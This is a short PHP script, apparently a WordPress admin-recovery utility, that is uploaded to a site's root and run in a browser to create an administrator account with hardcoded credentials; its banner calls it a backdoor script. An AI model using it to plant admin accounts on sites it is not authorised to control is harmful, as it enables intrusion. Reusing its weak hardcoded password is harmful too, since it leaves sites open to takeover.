<?php
/*
 
Created by: craig@123marbella.com 16/03/2014
 
Name of script: Create WordPress Admin User
 
Description: This script will create an admin user in wordpress 
 
Usage: Create a new file in the root of the hosting account and drop this code into it then execute the script through the browser.
 
Note: ALWAYS delete this file from the server after use. Not tested on WPMU!
 
*/
 
###################################################
//settings - change them if necessary
###################################################
//this will be the path to the wordpress install relative to the root of the site
//EG: if you have installed wordpress inside of a sub directory enter the name of the directory below.
//if wordpress is installed in the root, then leave the field empty
$wordpress_folder = "";
 
//preferred username
$username = "webadmin";
 
//preferred password
$password = "WebAdmin!@#123";

//preferred email address
$email = 'lol@gmail.com';
###################################################
 //no need to change anything after here
###################################################

//check if there is a wordpress folder defined
if(!empty($wordpress_folder)) {
    $path_to_wp_load = $wordpress_folder .'/wp-load.php';
} else {
	$path_to_wp_load = 'wp-load.php';
}

echo '====================<br>';
echo 'Craigs Backdoor Wordpress Admin User Script<br>';
echo '====================<br>';
 
//first lets check if we can locate the wp-load.php file
echo 'checking for wp-load.php at '. $path_to_wp_load ;
echo '<br>';

if (!file_exists($path_to_wp_load)) {
    echo "ERROR! wp-load.php does not exist!";
    echo '<br>';
    exit;
}
 
echo $path_to_wp_load . ' EXISTS!';
echo '<br>';
 
//by now we should be plain sailing so go ahead and create the user
 
//execute the function to create the admin user
create_wp_admin_user($username, $password, $email, $path_to_wp_load);
 
function create_wp_admin_user($username, $password, $email, $path_to_wp_load) {
 
   //link this script into wordpress
   include($path_to_wp_load);
  
   if (!username_exists($username)) {
     $user_id = wp_create_user($username, $password, $email);
     $user = new WP_User($user_id);
     $user->set_role('administrator');
 
         echo 'user '.$username.' created! - dont forget to delete this file!!!!';
         echo '<br>';
         
   } else {
 
         echo 'ERROR! - ' . $username . ' already exists!';
         echo '<br>';
         exit;
 
   }
 
}

add_action('init','create_wp_admin_user');

echo '<br>';
echo '<-- end of script';
exit;
